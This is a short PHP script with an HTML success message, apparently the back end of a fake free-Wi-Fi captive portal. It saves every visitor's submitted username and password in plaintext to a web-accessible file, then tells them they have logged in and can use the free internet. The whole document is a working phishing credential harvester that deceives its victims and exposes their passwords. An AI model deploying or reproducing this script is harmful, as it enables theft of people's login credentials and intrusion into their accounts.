<?php
	$filename =  "/var/www/html/passwords";
	
	// Open the file to get existing content
		$current = file_get_contents($filename);
	// Append a new person to the file
		$current .= $_POST["uname"].",".$_POST["password"]."\n";
	// Write the contents back to the file
		file_put_contents($filename, $current);
?>
 
<h3>Success, You have logged in. You can now use the free internet!</h3>
